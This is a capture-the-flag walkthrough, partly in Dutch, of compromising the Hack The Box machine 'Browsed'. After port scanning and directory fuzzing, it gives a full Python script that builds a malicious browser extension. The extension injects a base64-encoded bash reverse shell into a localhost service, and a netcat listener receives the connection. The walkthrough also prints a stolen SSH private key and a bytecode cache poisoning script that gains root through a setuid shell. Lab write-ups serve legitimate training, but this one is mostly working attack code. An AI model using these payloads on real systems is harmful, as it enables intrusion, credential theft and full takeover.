# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Browsed]
└─$ nmap 10.129.38.0                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 17:55 CET
Nmap scan report for 10.129.38.0
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Browsed]
└─$ nmap -p22,80 -sCV 10.129.38.0
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 18:00 CET
Nmap scan report for 10.129.38.0
Host is up (1.7s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben gaan kijken naar de webpagina. Daar kan je zien dat er verschillende keuzes zijn die je kan aanklikken. Als je op de homepage blijft zal je niets kunnen vinden. Ik ben dan nu gaan kijken naar de samples en daar kan je zien dat je samples zult kunnen downloaden die je meer inzicht zullen geven van hoe dat je de extension zult kunnen uploaden.

![[Pasted image 20260111180707.png]]

Ik ben dus naar de samples gaan kijken en ik ben deze allemaal eens gaan downloaden. Dit kan je zien aan de onderstaande foto.

![[Pasted image 20260111181106.png]]

Ik ben nu 1 van de samples gaan uploaden, maakt niet uit de welke je zal uploaden. Daar zal je kunnen zien dat er een notify request naar een andere htb fqdn gestuurd wordt. Je kan dit zien door in de ouput van de upload te kijken. Ik zal de fqdn nu gaan toevoegen aan de hosts file en kijken wat ik op de andere pagina kan vinden

![[Pasted image 20260111190221.png]]

```
# sudo nano /etc/hosts
10.129.38.0 browsed.htb browseinternal.htb
```

Op de nieuwe pagina kan je zien dat het een gitea pagina is. De gitea pagina wordt gerunned op de versie 1.24.5. Ik ben door gebruik te maken van de ffuf tool gaan kijken welke subdirectories er waren op de gitea pagina. Hieronder kan je zien dat er een v2 en een larry directory gevonden wordt.

```
┌──(kali㉿kali)-[~/HTB/Browsed/fontify]
└─$ ffuf -u http://browsedinternals.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac

v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 26ms]
larry                   [Status: 200, Size: 22468, Words: 1870, Lines: 433, Duration: 398ms]
```

Ik zal eens gaan kijken wat er op de larry pagina gevonden wordt. aangezien ik voor de v2 momenteel geen rechten heb. Binnen larry kan je zien dat er 1 repo gekent is. Deze repo heeft de naam MarkdownPreview. Ik ben op mijn windows machine een nieuwe dir gaan aanmaken en deze gitea genoemd. Hierin zal ik een git clone doen van de repo die we net gevonden hebben.

```
┌──(kali㉿kali)-[~/HTB/Browsed/gitea]
└─$ git clone http://browsedinternals.htb/larry/MarkdownPreview.git
Cloning into 'MarkdownPreview'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), done.
```

Na veel opzoek werk heb ik gezien dat er ook niets in de git folder te vinden was. Waarbij ik dus weer naar de oplossing ben gaan zoeken voor een connectie te maken met de server door gebruik te maken van de extensions upload. Hierbij ben ik op de volgende code gekomen waarbij ik mijn ip address ben gaan veranderen in de code, Als ik de code uitvoer zal een .zip file gemaakt worden. Door gebruik te maken van de zip en deze te gaan uploaden op de server zal ik een rce connectie met de server krijgen als de gebruiker larry. 

Code dat ik gebruikt heb voor de .zip file te maken

```
┌──(kali㉿kali)-[~/HTB/Browsed/gitea/MarkdownPreview]
└─$ cat rce.py 
import zipfile
import io
import base64

def create_shell_extension(my_ip, my_port="9001"):
    zip_buffer = io.BytesIO()
    
    # 1. The Reverse Shell One-Liner (Standard Bash)
    # We encode it to avoid breaking the JSON or the URL string
    raw_shell = f"bash -i >& /dev/tcp/{my_ip}/{my_port} 0>&1"
    b64_shell = base64.b64encode(raw_shell.encode()).decode()
    
    # This is the payload that will be executed on the server
    # It decodes itself and pipes into bash
    shell_payload = f"echo${{IFS}}{b64_shell}|base64${{IFS}}-d|bash"

    # 2. Manifest V3
    manifest = '''{
        "manifest_version": 3,
        "name": "Security Optimizer",
        "version": "1.1",
        "background": {
            "service_worker": "background.js"
        },
        "host_permissions": ["*://127.0.0.1/*", "*://localhost/*"]
    }'''

    # 3. background.js
    # We will try both the routine path and a potential root injection
    background = f'''
    const ip = "{my_ip}";
    const payload = "{shell_payload}";
    
    // We send it via a background loop to ensure it fires
    async function triggerShell() {{
        const urls = [
            `http://127.0.0.1:5000/routines/a[$(${{payload}})]`,
            `http://127.0.0.1:5000/routines/a';${{payload}} #`
        ];

        for (const url of urls) {{
            fetch(url, {{ mode: 'no-cors' }});
        }}
    }}

    triggerShell();
    '''

    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("manifest.json", manifest)
        zip_file.writestr("background.js", background)

    with open("shell_exploit.zip", "wb") as f:
        f.write(zip_buffer.getvalue())

    print(f"[+] shell_exploit.zip created.")
    print(f"[+] Listener command: nc -lvnp {my_port}")
    print(f"[+] Encoded payload: {shell_payload}")

if __name__ == "__main__":
    # Change this to your HTB Tun0 IP
    create_shell_extension("10.10.16.154", "9001")

```

Er wordt hierbij een Shell_exploit.zip aangemaakt, deze zal je moeten gaan uploaden en zal je te zien krijgen op de listener dat je een connectie met de server gemaakt hebt.

```
┌──(kali㉿kali)-[~/…/Browsed/gitea/MarkdownPreview/.git]
└─$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.38.0 46768
bash: cannot set terminal process group (1456): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ 
```

Nu dat we een connectie met de server heb ik de user flag gevonden.

```
larry@browsed:~$ cat user.txt
cat user.txt
c86bb3b7111c40627198054093d0ba0e
```

Binnen de user larry ben ik ook eens gaan kijken of er geen private ssh keys zijn die ik kan gebruiken voor een ssh connectie te maken met de server. Zoals je kunt zien is er een private key gevonden.

```
larry@browsed:~/.ssh$ ls -la
ls -la
total 20
drwx------ 2 larry larry 4096 Jan  6 10:28 .
drwxr-x--- 9 larry larry 4096 Jan  6 11:11 ..
-rw------- 1 larry larry   95 Aug 17 12:49 authorized_keys
-rw------- 1 larry larry  399 Aug 17 12:48 id_ed25519
-rw-r--r-- 1 larry larry   95 Aug 17 12:48 id_ed25519.pub

larry@browsed:~/.ssh$ cat id_ed25519
cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```

Ik ben de private key gaan nemen en heb een file gemaakt op mijn eigen machine. Daarin ben ik de private key gaan zetten en heb de file de juiste permissions gegeven zodat ik door het volgende commando te gebruiken mijn connectie kon maken tot de ssh server.

```
┌──(kali㉿kali)-[~/HTB/Browsed]
└─$ sudo chmod 600 private_key

┌──(kali㉿kali)-[~/HTB/Browsed]
└─$ sudo ssh -i private_key larry@browsed.htb
The authenticity of host 'browsed.htb (10.129.38.0)' can't be established.
ED25519 key fingerprint is: SHA256:fAVdIajQ8u8b/YUonzJCT/ib1bhL6pA1TZzkODyME4U
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Last login: Sun Jan 11 19:28:15 2026 from 10.10.16.154
larry@browsed:~$
```

Ik ben nu gebruik gaan maken van het sudo -l commando voor het zien of ik geen manier heb voor root files te execute zonder dat ik het root password heb, en zoals je kan zien kan de extension_tool.py applicatie gaan uitvoeren zonder admin te zijn.

```
larry@browsed:~$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

### Python Bytecode Cache Poisoning

```
larry@browsed:~$ # Create the exploit script in /tmp
cat << 'EOF' > /tmp/exploit.py
import os
import py_compile
import shutil
import sys

ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
# Fixed the path to __pycache__ based on your previous 'ls'
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

# The payload that will execute as root
payload = 'import os\ndef validate_manifest(path): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\ndef clean_temp_files(arg): pass\n'

# Padding with comments to match the exact size of the original file
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# Sync timestamps
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# Compile
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")

# Inject
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/malicious.pyc", TARGET_PYC)
print("[+] Poisoned .pyc injected successfully")
EOF
larry@browsed:~$ python3.12 /tmp/exploit.py
[+] Poisoned .pyc injected successfully
larry@browsed:~$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
[-] Skipping version bumping
[-] Skipping packaging

```

```
larry@browsed:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(larry) gid=1000(larry) euid=0(root) egid=0(root) groups=0(root),1000(larry)
rootbash-5.2# cat /root/root.txt
2e08bc5d5669f2f2e8255bc0349eae8f
```


![[Pasted image 20260111204624.png]]